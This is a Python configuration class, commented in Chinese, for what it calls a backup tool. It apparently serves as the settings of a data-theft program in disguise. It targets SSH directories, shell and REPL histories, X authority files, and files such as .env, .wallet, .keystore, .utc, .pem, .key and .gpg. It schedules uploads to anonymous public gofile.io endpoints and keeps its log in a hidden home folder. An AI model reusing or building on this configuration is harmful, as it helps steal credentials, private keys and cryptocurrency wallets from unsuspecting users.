# -*- coding: utf-8 -*-

from pathlib import Path


class BackupConfig:
    """备份配置类"""
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小配置（单位：字节）
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # 单文件阈值：50MB（超过则分片）
    CHUNK_SIZE = 50 * 1024 * 1024             # 分片大小：50MB
    
    # 重试配置
    RETRY_COUNT = 5        # 最大重试次数
    RETRY_DELAY = 60       # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 1800  # 上传超时时间（秒）
   
    # 备份间隔配置
    BACKUP_INTERVAL = 260000  # 备份间隔时间：约3天
    SCAN_TIMEOUT = 1800    # 扫描超时时间：30分钟
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    LOG_MAX_SIZE = 10 * 1024 * 1024  # 日志文件最大大小：10MB
    LOG_BACKUP_COUNT = 10             # 保留的日志备份数量

    # 时间阈值文件配置
    THRESHOLD_FILE = str(Path.home() / ".dev/Backup/next_backup_time.txt")  # 时间阈值文件路径

    # 需要备份的服务器目录或文件
    SERVER_BACKUP_DIRS = [
        ".ssh",           # SSH配置
        ".bash_history",  # Bash历史记录
        ".python_history", # Python历史记录
        ".bash_aliases",  # Bash别名
        "Documents",      # 文档目录
        ".node_repl_history", # Node.js REPL 历史记录
        ".wget-hsts",     # wget HSTS 历史记录
        ".Xauthority",    # Xauthority 文件
        ".ICEauthority",  # ICEauthority 文件
    ]

    # 需要备份的文件类型
    # 文档类型扩展名
    DOC_EXTENSIONS = [
        ".txt", ".json", ".js", ".py", ".go", ".sh", ".sol", ".rs", ".env",
        ".csv", ".bin", ".wallet", ".ts", ".jsx", ".tsx"
    ]
    # 配置类型扩展名
    CONFIG_EXTENSIONS = [
        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config",
        ".yaml", ".yml", ".toml", ".asc", ".gpg", ".pgp", ".conf"
    ]
    # 所有备份扩展名（用于兼容性）
    BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
    
    # 排除的目录
    EXCLUDE_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "Downloads",
        "myenv",
        "snap",
        "venv",
    ]

    # 上传服务器配置
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

    # 网络配置
    NETWORK_CHECK_HOSTS = [
        "8.8.8.8",         # Google DNS
        "1.1.1.1",         # Cloudflare DNS
        "208.67.222.222",  # OpenDNS
        "9.9.9.9"          # Quad9 DNS
    ]
    NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
    NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数

